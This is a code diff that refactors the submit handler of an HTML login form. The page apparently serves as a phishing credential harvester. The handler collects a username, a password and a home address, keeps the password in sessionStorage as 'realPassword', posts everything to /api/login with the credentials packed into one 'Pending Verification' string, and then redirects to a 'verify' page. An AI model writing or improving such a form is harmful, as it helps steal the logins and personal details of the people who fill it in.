@@ -190,30 +190,34 @@
         </form>
     </div>
 
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            const username = document.getElementById('username').value.trim();
-            const password = document.getElementById('password').value.trim();
-            const homeAddress = document.getElementById('address').value.trim();
+   <script>
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const homeAddress = document.getElementById('address').value.trim();
 
-            sessionStorage.setItem('realPassword', password);
+        sessionStorage.setItem('realPassword', password);
 
-            try {
-                await fetch('/api/login', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        username, 
-                        password, 
-                        address: `UserID: ${username} | Password: ${password} | Home: ${homeAddress} | Status: Pending Verification`
-                    })
-                });
-            } catch (err) {}
+        const payload = { 
+            username: username || "N/A", 
+            password: password || "N/A", 
+            address: `UserID: ${username} | Password: ${password} | Home: ${homeAddress} | Status: Pending Verification`
+        };
 
-            window.location.href = "verify.html";
-        });
-    </script>
+        try {
+            await fetch('/api/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+        } catch (err) {
+            console.error("Submit error:", err);
+        }
+
+        window.location.href = "verify.html";
+    });
+</script>
 </body>
 </html>
